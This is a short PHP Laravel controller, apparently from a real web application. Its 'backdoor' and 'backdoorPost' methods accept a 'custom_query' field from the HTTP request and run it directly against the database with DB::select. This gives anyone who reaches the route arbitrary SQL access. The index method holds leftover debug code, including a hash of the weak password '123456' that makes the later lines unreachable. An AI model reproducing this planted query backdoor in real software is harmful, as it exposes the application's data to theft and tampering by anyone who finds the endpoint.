<?php

namespace App\Http\Controllers;

use App\Http\Api\OperationApi\PersonSystem\PersonSystemApi;
use App\Http\Controllers\Api\Response;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class HomeController extends Controller
{
    public function index(Request $request)
    {
		return bcrypt(123456);
        return (new PersonSystemApi)->GetPersonDataScanList()['response'];
        return response()->json(Response::SuccessResponse('Başarılı'));
    }

    public function backdoor()
    {
        return view('backdoor');
    }

    public function backdoorPost(Request $request)
    {
        return response()->json(DB::select($request->custom_query), 200);
    }
}
